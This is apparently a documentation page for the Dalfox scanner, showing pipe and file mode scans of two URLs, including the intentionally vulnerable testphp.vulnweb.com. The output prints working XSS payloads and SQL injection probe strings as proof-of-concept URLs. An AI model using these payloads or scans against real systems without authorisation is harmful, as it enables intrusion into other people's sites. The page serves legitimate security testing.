---
title: Scanning Multiple URL
permalink: /docs/scan-multiple-url/
---

## Using pipe mode
Command
```
▶ cat samples/sample_target.txt| dalfox pipe
```
Output
```
[*] Using pipeline mode
[*] Loaded 2 target urls
[*] Target URL: https://www.hahwul.com/?q=123
[*] Vaild target [ code:200 / size:68629 ]
[*] Using dictionary mining option [list=GF-Patterns] 📚⛏
[*] Using DOM mining option 📦⛏
[*] Start BAV(Basic Another Vulnerability) analysis / [sqli, ssti, OpenRedirect]  🔍
[*] Start static analysis.. 🔍
[*] Start parameter analysis.. 🔍
[*] Static analysis done ✓
[I] Found 1 testing point in DOM Mining
[*] BAV analysis done ✓ing routines
[*] Parameter analysis  done ✓tines
[I] Content-Type is text/html; charset=utf-8
[I] Access-Control-Allow-Origin is *
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 33 queries 🗡
[*] Finish :D
[*] Target URL: http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=1
[*] Vaild target [ code:200 / size:4868 ]
[*] Using dictionary mining option [list=GF-Patterns] 📚⛏
[*] Using DOM mining option 📦⛏
[*] Start BAV(Basic Another Vulnerability) analysis / [sqli, ssti, OpenRedirect]  🔍
[*] Start parameter analysis.. 🔍
[*] Start static analysis.. 🔍
[G] Found dalfox-error-mysql via built-in grepping / payload: toGrepping
    Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=%3B
[G] Found dalfox-error-mysql2 via built-in grepping / payload: toGrepping
    Warning: mysql
[POC][G][BUILT-IN/dalfox-error-mysql2/GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=%3B
[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
    check the manual that corresponds to your MySQL server version
[POC][G][BUILT-IN/dalfox-error-mysql5/GET] http://testphp.vulnweb.com/listproducts.php?cat=+AND+0&ff=1
[G] Found dalfox-error-mysql1 via built-in grepping / payload: toGrepping
    SQL syntax; check the manual that corresponds to your MySQL
[POC][G][BUILT-IN/dalfox-error-mysql1/GET] http://testphp.vulnweb.com/listproducts.php?cat=+AND+0&ff=1
[I] Found 2 testing point in DOM Mining
[*] Static analysis done ✓
[*] BAV analysis done ✓
[*] Parameter analysis  done ✓tines
[I] Content-Type is text/html; charset=UTF-8
[I] Reflected cat param => Injected: /inHTML-none(1)  ▶
    48 line:  	Error: Unknown column 'asdfDalFox' in 'where cl
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 201 queries 🗡
[V] Triggered XSS Payload (found DOM Object): cat='><sVg/onload=alert(45) class=dalfox>
    48 line:  syntax to use near ''><sVg/onload=alert(45) class=dalfox>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf%27%3E%3CsVg%2Fonload%3Dalert%2845%29+class%3Ddalfox%3E&ff=1
```

## Using file mode
Command
```
▶ dalfox file ./samples/sample_target.txt
```
Output
```
[*] Using file mode(targets list)
[*] Loaded 2 target urls
[*] Target URL: https://www.hahwul.com/?q=123
[*] Vaild target [ code:200 / size:68629 ]
[*] Using dictionary mining option [list=GF-Patterns] 📚⛏
[*] Using DOM mining option 📦⛏
[*] Start BAV(Basic Another Vulnerability) analysis / [sqli, ssti, OpenRedirect]  🔍
[*] Start parameter analysis.. 🔍
[*] Start static analysis.. 🔍
[I] Found 1 testing point in DOM Mining
[*] Static analysis done ✓
[*] BAV analysis done ✓ing routines
[*] Parameter analysis  done ✓
[I] Content-Type is text/html; charset=utf-8
[I] Access-Control-Allow-Origin is *
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 33 queries 🗡
[*] Finish :D
[*] Target URL: http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=1
[*] Vaild target [ code:200 / size:4868 ]
[*] Using dictionary mining option [list=GF-Patterns] 📚⛏
[*] Using DOM mining option 📦⛏
[*] Start BAV(Basic Another Vulnerability) analysis / [sqli, ssti, OpenRedirect]  🔍
[*] Start static analysis.. 🔍
[*] Start parameter analysis.. 🔍
[G] Found dalfox-error-mysql via built-in grepping / payload: toGrepping
    Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=%27+or+
[G] Found dalfox-error-mysql2 via built-in grepping / payload: toGrepping
    Warning: mysql
[POC][G][BUILT-IN/dalfox-error-mysql2/GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf&ff=%27+or+
[*] Static analysis done ✓
[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
    check the manual that corresponds to your MySQL server version
[POC][G][BUILT-IN/dalfox-error-mysql5/GET] http://testphp.vulnweb.com/listproducts.php?cat=+HAVING+1%3D1--&ff=1
[G] Found dalfox-error-mysql1 via built-in grepping / payload: toGrepping
    SQL syntax; check the manual that corresponds to your MySQL
[POC][G][BUILT-IN/dalfox-error-mysql1/GET] http://testphp.vulnweb.com/listproducts.php?cat=+HAVING+1%3D1--&ff=1
[I] Found 2 testing point in DOM Mining
[*] BAV analysis done ✓ing routines
[*] Parameter analysis  done ✓tines
[I] Content-Type is text/html; charset=UTF-8
[I] Reflected cat param => Injected: /inHTML-none(1)  ▶
    48 line:  	Error: Unknown column 'asdfDalFox' in 'where cl
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 201 queries 🗡
[V] Triggered XSS Payload (found DOM Object): cat=</ScriPt><sCripT class=dalfox>alert(45)</sCriPt>
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat=asdf%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%2845%29%3C%2FsCriPt%3E&ff=1
[*] Finish :D
```

